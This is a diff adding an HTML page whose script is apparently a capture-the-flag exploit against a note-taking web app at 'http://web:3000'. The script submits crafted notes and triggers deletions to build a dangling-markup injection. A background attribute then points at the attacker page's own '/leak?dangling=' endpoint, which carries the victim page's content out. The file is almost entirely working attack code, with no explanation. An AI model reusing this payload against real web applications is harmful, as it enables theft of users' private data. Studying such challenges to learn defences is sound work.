@@ -1,0 +1,33 @@
+<body>
+  <form id="create" action="..." method="post" target="win">
+    <input type="text" name="note" />
+  </form>
+  <script type="module">
+    const BASE_URL = "http://web:3000";
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    const win = open("", "win");
+    const createNote = async (note) => {
+      const form = document.forms[0];
+      form.action = `${BASE_URL}/new`;
+      form.note.value = note;
+      form.submit();
+      await sleep(500);
+    };
+
+    const deleteLast = async (num) => {
+      for (let i = 0; i < num; i++) {
+        win.location = `${BASE_URL}/notes`;
+        await sleep(100);
+      }
+    };
+
+    await createNote(`Y|${'"'.repeat(20)}`);
+    await createNote(`Z|$<table></table>`);
+    await deleteLast(`></table></article>`.length - 2 - 1);
+    await createNote(`|/background="${location.origin}/leak?dangling=`);
+    await createNote(`X"<table></table>`);
+    // ref. https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#background-attribute
+  </script>
+</body>
